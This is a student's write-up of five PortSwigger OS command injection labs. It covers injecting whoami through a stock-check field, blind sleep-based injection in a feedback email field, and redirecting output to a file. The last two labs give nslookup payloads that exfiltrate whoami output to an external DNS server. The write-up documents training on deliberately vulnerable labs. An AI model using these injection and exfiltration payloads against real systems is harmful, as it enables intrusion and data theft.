# Portswigger oc command injection labs

## Lab1:
On clicking on any of the products and clicking on stock, we get a post request o burp. In that we have 2 fields product id and storeid. We do not know 
which is vulnerable.
We start by commenting out the storid using a hash and adding a whoami commad before it, url encoding it and sending it using repeater. This gives the 
result of whoami which is peter-XOgFef
![image](https://github.com/poorvi1910/Web/assets/146640913/31187974-cef5-4e1c-812a-c802a9415a98)

## Lab2:
We have not been given source here. Hence we need to go with the blind injection approach using sleep. When we go to feedback link and submit a feedback 
and analyze the request,we need to find out which field is vulnerable. The email field gives us a delay in response. Hece we know that this field is where 
the payload goes.

## Lab3:
We have not been given source here either. Hence we need to go with the blind injection approach using sleep. When we turn on filter for images, we get a 
list of all the images used.
When we send this to repeater we see that the name of the image can conveniently be changed to that of another file within the folder to access information.
From the previous challenege we saw that the email field was vulnerable. Sending the whoami command to a text file in the mentioned folder and sending a request
using intruder to tht file, we get the whoami output

## Lab4:
The same email field is being used to exploit the application by using `& nslookup <server> #` urlencoded as the payload
which triggers interactions with an extrenal domain and the lab is solved.

## Lab5:
The same email field is being used to exploit the application and then exfiltrate data by using "& nslookup `whoami`.<server> #" or `& nslookup $(whoami).<server> #` urlencoded as the payload
which triggers interactions with an extrenal domain and retrieves data too and the lab is solved.
